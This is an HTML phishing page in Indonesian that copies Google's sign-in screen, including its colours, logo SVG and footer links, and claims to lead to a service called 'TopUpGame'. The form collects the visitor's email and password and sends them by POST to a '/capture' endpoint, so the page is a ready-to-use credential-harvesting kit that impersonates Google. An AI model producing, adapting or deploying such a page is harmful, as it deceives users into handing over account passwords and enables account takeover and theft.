<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Masuk - Akun Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Roboto, 'Helvetica Neue', Arial, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; }
        .logo { display: flex; justify-content: center; margin-bottom: 16px; }
        .logo svg { width: 74px; height: 24px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 4px; text-align: center; }
        .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 32px; }
        .input-box { margin-bottom: 24px; }
        .input-box input {
            width: 100%; padding: 14px 15px; font-size: 16px;
            border: 1px solid #dadce0; border-radius: 4px; outline: none;
        }
        .input-box input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
        .forgot { font-size: 14px; color: #1a73e8; font-weight: 500; text-decoration: none; display: block; margin-top: -10px; margin-bottom: 24px; }
        .guest { font-size: 14px; color: #5f6368; margin-bottom: 32px; line-height: 1.4; }
        .guest a { color: #1a73e8; text-decoration: none; }
        .btn-row { display: flex; justify-content: space-between; align-items: center; }
        .btn-create { font-size: 14px; color: #1a73e8; font-weight: 500; text-decoration: none; }
        .btn-next {
            background: #1a73e8; color: #fff; border: none; padding: 10px 24px;
            font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer;
        }
        .btn-next:hover { background: #1669d0; }
        .footer { display: flex; justify-content: center; gap: 24px; margin-top: 40px; }
        .footer a { font-size: 12px; color: #5f6368; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.24 8.19v2.46h5.92c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.58 1.8-3.5 0-6.22-2.88-6.22-6.44S5.74 2.67 9.24 2.67c2.12 0 3.63.83 4.77 1.92l1.68-1.68C14.34 1.5 12.08.4 9.24.4 4.43.4.46 4.38.46 9.11s3.97 8.71 8.78 8.71c4.48 0 7.52-3.15 7.52-7.6 0-.52-.05-1-.13-1.43H9.24z" fill="#4285F4"/><path d="M25.54 16.72V1.78h-2.04v14.94h2.04z" fill="#34A853"/><path d="M33.07 5.46c-1.47 0-2.63.82-3.18 2.05h-.04V5.72h-1.93v11h2.08v-5.75c0-1.86.74-2.85 2.15-2.85.3 0 .6.03.88.09V5.51a3.9 3.9 0 00-.96-.05z" fill="#EA4335"/><path d="M43.04 11.18c0-3.3-2.2-5.73-5.44-5.73-3.25 0-5.75 2.43-5.75 5.73 0 3.27 2.47 5.72 5.75 5.72 1.63 0 3.07-.56 4.1-1.67l-1.44-1.1c-.68.79-1.55 1.22-2.66 1.22-1.74 0-2.93-1.08-3.13-2.56h7.57v-.61zm-7.44-.92c.17-1.3 1.2-2.28 2.56-2.28 1.36 0 2.38.98 2.56 2.28h-5.12z" fill="#4285F4"/><path d="M53.18 16.72V.4h-2.04v16.32h2.04z" fill="#34A853"/><path d="M63.46 11.25c0-3.24-2.24-5.8-5.43-5.8s-5.7 2.5-5.7 5.73c0 3.3 2.3 5.72 5.76 5.72a5.26 5.26 0 004.1-1.67l-1.43-1.1c-.68.8-1.6 1.22-2.67 1.22-1.68 0-2.87-1.09-3.12-2.56h7.56v-.54zm-7.5-.92c.2-1.3 1.25-2.28 2.63-2.28 1.38 0 2.48 1 2.63 2.28h-5.25z" fill="#EA4335"/><path d="M74.5 16.72l-3.08-7.59-3.15 7.59h-2.23l4.27-9.94-2.48-5.55h2.2l6.87 15.49h-2.4z" fill="#34A853"/></svg>
        </div>
        <h1>Masuk</h1>
        <p class="subtitle">untuk melanjutkan ke TopUpGame</p>
        <form action="/capture" method="POST">
            <div class="input-box">
                <input type="email" name="email" placeholder="Email atau telepon" required autofocus>
            </div>
            <div class="input-box">
                <input type="password" name="pass" placeholder="Masukkan kata sandi Anda" required>
            </div>
            <a href="#" class="forgot">Lupa email?</a>
            <p class="guest">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a href="#">Pelajari lebih lanjut</a></p>
            <div class="btn-row">
                <a href="#" class="btn-create">Buat akun</a>
                <button type="submit" class="btn-next">Berikutnya</button>
            </div>
        </form>
        <div class="footer">
            <a href="#">Bantuan</a>
            <a href="#">Privasi</a>
            <a href="#">Persyaratan</a>
        </div>
    </div>
</body>
</html>
